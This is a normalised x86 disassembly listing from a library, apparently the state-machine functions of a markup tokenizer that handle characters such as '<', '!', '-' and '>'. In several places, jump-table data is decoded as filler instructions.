lea ebx [ esi + 0x3c ]
add esp 0x4
cmp [ ebx + 0x4 ] 0x0
mov [ ebp + 0x10 ] ecx
jne r-xdata
mov ebx [ ebp + 0x8 ]
push 0x13
mov eax ebx
call sub_10073350
mov ecx [ ebx + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x4 ] 0x1
call sub_10073950
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push 0x15
call sub_10073350
add esp 0x4
mov eax [ ebp + 0x10 ]
push ebx
push eax
push edi
call sub_10016b30
add esp 0xc
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
lea edx [ esi + 0x50 ]
lea eax [ esi + 0x94 ]
push edx
push eax
call sub_10037120
lea eax [ esi + 0x94 ]
push eax
call sub_1004ac70
add esp 0xc
mov [ esi + 0x48 ] eax
sub_1007672b
push es
push es
push es
add al [ edx ]
push es
add al [ esi ]
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
add al [ esi ]
add eax [ esi ]
push es
push es
add al 0x3
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
add eax [ ebx ]
add eax 0x6060606
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
add ecx esp
int3
sub_10076790
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0xc ]
mov eax [ ebx + 0x6c ]
sub eax 0x25
push esi
push edi
mov [ ebp - 0x4 ] 0x0
mov edi 0x1
je r-xdata
mov eax 0x22
sub eax edi
je r-xdata
mov edi [ esi + 0x8 ]
cmp [ edi + 0x40 ] 0x0
lea eax [ edi + 0x3c ]
mov [ ebp + 0xc ] eax
jne r-xdata
mov [ ebx + 0x4 ] edi
mov edi [ esi + 0x8 ]
cmp [ edi + 0x40 ] 0x0
lea ebx [ edi + 0x3c ]
mov [ ebp + 0x8 ] eax
jne r-xdata
mov eax 0x27
jmp r-xdata
sub eax edi
je r-xdata
push eax
push 0x26
push esi
call sub_10016b30
mov eax [ ebx + 0x6c ]
mov edx [ esi + 0x8 ]
add esp 0xc
pop edi
pop esi
mov [ edx ] eax
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
push ebx
push edx
push esi
call sub_10016b30
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax [ r--data ]
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ebp - 0xc ]
push ecx
push edi
push eax
lea edx [ ebx + 0x94 ]
push edx
push esi
call sub_10007c10
mov eax [ ebp - 0xc ]
add esp 0x14
cmp eax [ r--data ]
je r-xdata
mov eax 0x3e
mov [ ebp - 0x4 ] edi
jmp r-xdata
lea eax [ edi + 0x1f ]
jmp r-xdata
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_10037120
lea eax [ edi + 0x94 ]
push eax
call sub_1004ac70
mov [ edi + 0x48 ] eax
mov eax [ ebp + 0xc ]
add esp 0xc
mov ebx [ ebp + 0xc ]
mov eax [ ebx + 0x6c ]
mov edx [ esi + 0x8 ]
pop edi
pop esi
mov [ edx ] eax
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ esi + 0x8 ]
cmp [ edi + 0x40 ] 0x0
lea ebx [ edi + 0x3c ]
mov [ ebp + 0x8 ] eax
jne r-xdata
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_10037120
lea eax [ edi + 0x94 ]
push eax
call sub_1004ac70
add esp 0xc
mov [ edi + 0x48 ] eax
mov edx [ ebp + 0x8 ]
push ebx
push edx
push esi
call sub_10016b30
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_10037120
lea eax [ edi + 0x94 ]
push eax
call sub_1004ac70
add esp 0xc
mov [ edi + 0x48 ] eax
sub_10076910
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_10073e90
mov eax [ ebp + 0x10 ]
inc eax
cmp eax 0x3f
ja r-xdata
push 0x17
mov eax ebx
call sub_10073350
mov eax [ ebx + 0x8 ]
mov ecx [ ebp + 0xc ]
add esp 0x4
mov [ eax ] 0x21
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
pop ebx
pop ebp
retn
movzx eax [ eax + lookup_table_100769d8 ]
jmp [ eax * 4 + jump_table_100769c4 ]
mov ecx [ ebx + 0x8 ]
mov [ ecx ] 0x21
mov eax 0x2
pop ebx
pop ebp
retn
mov edx [ ebx + 0x8 ]
mov [ edx ] 0x2a
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
push ebx
mov [ eax ] 0x0
call sub_10073810
add esp 0x4
pop edi
pop ebx
pop ebp
retn
push 0x16
mov eax ebx
call sub_10073350
mov ecx [ ebx + 0x8 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_10073950
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] 0x1
mov eax 0x2
pop ebx
pop ebp
retn
sub_100769dd
add al 0x4
add al 0x4
add al 0x1
add [ ecx + eax ] eax
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x1
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al [ esp + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_10076a20
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
push 0x19
mov eax ebx
call sub_10073350
mov edx [ ebx + 0x8 ]
add esp 0x4
mov [ edx ] 0x0
call sub_10073950
pop ebx
mov eax 0x2
pop ebp
retn
cmp eax 0x3e
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
mov ecx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x14 ]
mov [ edx ] 0x0
push eax
mov [ ecx + 0x78 ] 0x1
call sub_10073810
add esp 0x4
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
push 0x1a
mov eax esi
call sub_10073350
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
add esp 0x4
mov [ eax ] 0x21
mov [ ecx + 0x4 ] 0x1
pop esi
mov eax 0x2
pop ebp
retn
sub_10076ab0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
cmp eax 0x3e
je r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ edx ] 0x0
call sub_10073a20
pop esi
pop ebp
retn
push ebx
mov ebx [ ebp + 0xc ]
push edi
pop edi
pop ebx
test eax eax
jne r-xdata
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push eax
push esi
call sub_10016b30
lea edi [ ebx + 0x94 ]
push edi
call sub_10032470
push edi
call sub_1003c6e0
add esp 0x14
cmp eax 0x3e
jne r-xdata
mov eax 0xfffd
cmp eax 0xffffffff
je r-xdata
sub_10076b10
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx 0x1
push ebx
push 0x2
lea esi [ edi + 0x94 ]
push r--data
push esi
call sub_1002a720
add esp 0x10
test eax eax
je r-xdata
push 0x0
push 0x7
push r--data
push esi
call sub_1002a720
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x2d
mov [ edi + 0x4 ] ebx
pop edi
pop esi
lea eax [ ebx + 0x1 ]
pop ebx
pop ebp
retn
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
push r--data
mov [ edx ] 0x33
push esi
mov [ edi + 0x4 ] ebx
call sub_1000ad70
push r--data
push esi
mov [ edi + 0x7c ] eax
call sub_1000ad70
push r--data
push esi
mov [ edi + 0x80 ] eax
call sub_1000ad70
add esp 0x18
mov [ edi + 0x84 ] eax
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x1b
mov eax esi
call sub_10073350
mov edx [ esi + 0x8 ]
mov [ edx ] 0x2b
add esp 0x4
mov [ edi + 0x4 ] ebx
call sub_100734d0
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
push ebx
push 0x7
push r--data
push esi
call sub_1002a720
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x43
mov [ edi + 0x4 ] ebx
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
sub_10076c10
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x1 ]
push esi
cmp eax 0x3f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
mov [ edx ] 0x2f
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push ecx
push eax
call sub_10016b30
add esp 0xc
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_10076cfc ]
jmp [ eax * 4 + jump_table_10076ce8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x2e
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10073350
mov eax [ esi + 0x8 ]
mov [ eax ] 0x2f
mov ecx [ esi + 0x8 ]
mov edx [ r--data ]
add ecx 0x10
push ecx
push edx
push esi
call sub_10016b30
add esp 0x10
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x1d
mov eax esi
call sub_10073350
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10073a20
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x1c
mov eax esi
call sub_10073350
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_10073a20
xor eax eax
pop esi
pop ebp
retn
sub_10076d01
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_10076d40
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ edi + 0x1 ]
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x2f
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x2d
push esi
call sub_10016b30
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push edi
push esi
call sub_10016b30
add esp 0x18
pop edi
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_10076e50 ]
jmp [ eax * 4 + jump_table_10076e3c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
pop edi
mov [ edx ] 0x31
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10073350
mov eax [ esi + 0x8 ]
mov [ eax ] 0x2f
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x2d
push esi
call sub_10016b30
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x10
push edx
push eax
push esi
call sub_10016b30
add esp 0x1c
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x1d
mov eax esi
call sub_10073350
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_10073a20
pop edi
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x1c
mov eax esi
call sub_10073350
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ edx ] 0x0
call sub_10073a20
pop edi
xor eax eax
pop esi
pop ebp
retn
sub_10076e55
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add edx [ ebp - 0x75 ]
in al dx
mov eax [ ebp + 0x10 ]
push esi
cmp eax 0xffffffff
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x1c
mov eax esi
call sub_10073350
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_10073a20
xor eax eax
pop esi
pop ebp
retn
test eax eax
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10073350
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x10
push edx
push eax
push esi
call sub_10016b30
add esp 0x10
mov eax 0x2
pop esi
pop ebp
retn
cmp eax 0x2d
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x30
mov eax 0x2
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
add edx 0x10
push edx
push eax
push ecx
call sub_10016b30
add esp 0xc
mov eax 0x2
pop esi
pop ebp
retn
sub_10076f30
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp edi 0xffffffff
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x1c
mov eax esi
call sub_10073350
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10073a20
pop edi
xor eax eax
pop esi
pop ebp
retn
test edi edi
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10073350
mov edx [ esi + 0x8 ]
mov [ edx ] 0x2f
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push 0x2d
push esi
call sub_10016b30
mov ecx [ esi + 0x8 ]
mov edx [ r--data ]
add ecx 0x10
push ecx
push edx
push esi
call sub_10016b30
add esp 0x1c
pop edi
mov eax 0x2
pop esi
pop ebp
retn
cmp edi 0x2d
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
pop edi
mov [ ecx ] 0x31
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x2f
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x2d
push esi
call sub_10016b30
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push edi
push esi
call sub_10016b30
add esp 0x18
pop edi
mov eax 0x2
pop esi
pop ebp
retn
sub_10077000
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ edi + 0x1 ]
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x1d
mov eax esi
call sub_10073350
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x2f
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x2d
push esi
call sub_10016b30
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push 0x2d
push esi
call sub_10016b30
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push edi
push esi
call sub_10016b30
add esp 0x28
pop edi
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_10077160 ]
jmp [ eax * 4 + jump_table_10077148 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
call sub_10073a20
pop edi
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10073350
mov edx [ esi + 0x8 ]
mov [ edx ] 0x2f
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push 0x2d
push esi
call sub_10016b30
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x2d
push esi
call sub_10016b30
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x10
push edx
push eax
push esi
call sub_10016b30
add esp 0x28
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x1e
mov eax esi
call sub_10073350
mov ecx [ esi + 0x8 ]
add esp 0x4
pop edi
mov [ ecx ] 0x32
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x1f
mov eax esi
call sub_10073350
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x2d
push esi
call sub_10016b30
add esp 0x10
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10073350
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10073a20
pop edi
xor eax eax
pop esi
pop ebp
retn
sub_10077166
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5020505
add eax 0x5050505
add eax 0x5050505
add eax [ 0x5050505 ]
add eax 0x5050505
add eax 0x5050505
add eax 0xec8b5504
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ edi + 0x1 ]
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x2f
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x2d
push esi
call sub_10016b30
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push 0x2d
push esi
call sub_10016b30
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x21
push esi
call sub_10016b30
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push edi
push esi
call sub_10016b30
add esp 0x30
pop edi
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_10077310 ]
jmp [ eax * 4 + jump_table_100772fc ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x30
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x2d
push esi
call sub_10016b30
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push 0x2d
push esi
call sub_10016b30
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x21
push esi
call sub_10016b30
add esp 0x24
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ edx ] 0x0
call sub_10073a20
pop edi
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10073350
mov eax [ esi + 0x8 ]
mov [ eax ] 0x2f
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x2d
push esi
call sub_10016b30
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x2d
push esi
call sub_10016b30
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push 0x21
push esi
call sub_10016b30
mov ecx [ esi + 0x8 ]
mov edx [ r--data ]
add ecx 0x10
push ecx
push edx
push esi
call sub_10016b30
add esp 0x34
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x21
mov eax esi
call sub_10073350
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10073a20
pop edi
xor eax eax
pop esi
pop ebp
retn
sub_10077315
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add edx [ ebp - 0x75 ]
in al dx
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x21
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x24
mov eax esi
call sub_10073350
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov ecx 0x1
mov [ edx ] 0x34
add esp 0x4
mov [ eax + 0x4 ] ecx
mov [ eax + 0x88 ] ecx
lea eax [ ecx + 0x1 ]
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_100773ec ]
jmp [ eax * 4 + jump_table_100773e0 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x34
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_10073350
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_100737a0
xor eax eax
pop esi
pop ebp
retn
sub_100773ef
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ ecx ]
add [ edx ] eax
add [ edx ] eax
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add esp ecx
int3
sub_10077410
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
lea ecx [ eax + 0x1 ]
push esi
cmp ecx 0x3f
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x35
mov edx [ ebp + 0xc ]
mov [ edx + 0x88 ] 0x0
lea edx [ eax - 0x41 ]
cmp edx 0x19
ja r-xdata
movzx ecx [ ecx + lookup_table_10077528 ]
jmp [ ecx * 4 + jump_table_10077514 ]
mov edx [ ecx + 0x8 ]
add edx 0x10
push edx
push eax
push ecx
call sub_10016b30
add esp 0xc
add eax 0x20
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10073350
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x35
mov [ eax + 0x88 ] 0x1
mov ecx [ esi + 0x8 ]
mov edx [ r--data ]
add ecx 0x10
push ecx
push edx
push esi
call sub_10016b30
add esp 0x10
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x25
mov eax esi
call sub_10073350
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_100737a0
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_10073350
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_100737a0
xor eax eax
pop esi
pop ebp
retn
mov eax 0x2
pop esi
pop ebp
retn
sub_1007752d
add al 0x4
add al 0x4
add al 0x2
add al [ edx + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x3
int3
sub_10077570
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
lea ecx [ eax + 0x1 ]
push esi
push edi
cmp ecx 0x3f
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x35
mov edx [ ebp + 0xc ]
mov [ edx + 0x88 ] 0x0
lea edx [ eax - 0x41 ]
cmp edx 0x19
ja r-xdata
movzx ecx [ ecx + lookup_table_100776bc ]
jmp [ ecx * 4 + jump_table_100776a8 ]
mov edx [ ecx + 0x8 ]
add edx 0x10
push edx
push eax
push ecx
call sub_10016b30
add esp 0xc
pop edi
mov eax 0x2
pop esi
pop ebp
retn
add eax 0x20
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
mov edi [ ebp + 0xc ]
mov [ edx ] 0x36
mov eax [ edi + 0x7c ]
add edi 0x7c
push eax
push esi
call sub_10035fe0
push edi
call sub_10073540
add esp 0xc
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov edi [ ebp + 0xc ]
mov [ ecx ] 0x0
mov edx [ edi + 0x7c ]
add edi 0x7c
push edx
push esi
call sub_10035fe0
push edi
call sub_10073540
mov eax [ ebp + 0x14 ]
add esp 0xc
call sub_100737a0
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10073350
mov eax [ esi + 0x8 ]
mov ecx [ r--data ]
add eax 0x10
push eax
push ecx
push esi
call sub_10016b30
add esp 0x10
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_10073350
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
lea edi [ eax + 0x7c ]
mov [ eax + 0x88 ] 0x1
mov eax [ edi ]
push eax
push esi
call sub_10035fe0
push edi
call sub_10073540
mov eax [ ebp + 0x14 ]
add esp 0x10
call sub_100737a0
pop edi
xor eax eax
pop esi
pop ebp
retn
sub_100776c1
add al 0x4
add al 0x4
add al 0x2
add al [ edx + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x3
int3
sub_10077700
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
push edi
mov edi [ ebp + 0xc ]
push 0x0
push 0x6
lea esi [ edi + 0x94 ]
push r--data
push esi
call sub_1002a720
add esp 0x10
test eax eax
je r-xdata
movzx eax [ eax + lookup_table_10077814 ]
jmp [ eax * 4 + jump_table_10077804 ]
push 0x0
push 0x6
push r--data
push esi
call sub_1002a720
add esp 0x10
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x37
mov [ edi + 0x4 ] 0x1
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
call sub_100737a0
mov eax 0x1
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_10073350
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_100737a0
xor eax eax
pop esi
pop ebp
retn
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x26
mov eax esi
call sub_10073350
mov edx [ esi + 0x8 ]
add esp 0x4
mov [ edx ] 0x42
mov [ edi + 0x88 ] 0x1
pop edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x3d
mov [ edi + 0x4 ] 0x1
pop edi
mov eax 0x2
pop esi
pop ebp
retn
sub_10077818
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ecx ] eax
add eax [ ecx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ecx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
int3
sub_10077860
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_10073350
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x42
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_100737a0
xor eax eax
pop esi
